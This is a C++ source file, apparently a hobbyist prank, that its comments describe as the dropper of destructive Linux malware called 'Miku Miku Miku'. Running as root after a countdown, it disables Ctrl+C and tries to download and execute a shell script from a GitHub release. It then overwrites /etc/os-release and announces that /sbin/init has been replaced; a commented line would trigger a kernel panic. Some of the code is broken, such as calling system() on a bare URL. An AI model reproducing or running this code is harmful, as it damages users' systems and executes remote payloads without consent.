#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <csignal>
#include <fstream>

// The dropper of Miku Miku Miku.
// This part is to drop the rest of the malware into the system.

int repeatLoop = 5;
int myCodeIsBad = 5;

int main()
{
    int uid = getuid();
    if (uid != 0)
    {
      std::cerr << "ERROR: binary was not launched with root/uid 0\n";
      return EXIT_FAILURE;
    } else if (uid == 0) {

    std::cout << "Are you absolutely sure you would like to continue??\nThere is no going back after running this fully.\n(y/N) >>> ";

    std::string answer;
    std::cin >> answer;

    if (answer == "y") {

      while(repeatLoop--)
      {
        std::cout << "\033[2J\033[1;1HYOU HAVE " << myCodeIsBad-- << " SECONDS TO PRESS CTRL + C, IF YOU DO NOT KNOW WHAT THIS IS, PRESS CTRL + C NOW!!" << std::flush;
        sleep(1);
      }

    std::signal(SIGINT, SIG_IGN);
    // Had so many issues with the C++ downloading script, just gonna make a shell script at this point.

    system("https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild5/downloader.sh");
    system("chmod +x downloader.sh");
    system("./downloader.sh");

    // Your distro is bad, let's fix that!
    std::ofstream OsRelease("/etc/os-release");
    
    OsRelease.open("/etc/os-release");

    OsRelease << "NAME=Hatsune Miku Linux\nPRETTY_NAME=Hatsune Miku Linux\nID=miku\n";
    OsRelease.close();

    std::cout << "\033[2J\033[1;1HHatsune Miku and FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";

    // This is the end of the pre-reboot payload. IT'S KERNEL PANIC TIME!!!!!
    // system("echo c > /proc/sysrq-trigger");

    return EXIT_SUCCESS;
    } else {
      std::cout << "Quitting...";
    }
    }
}
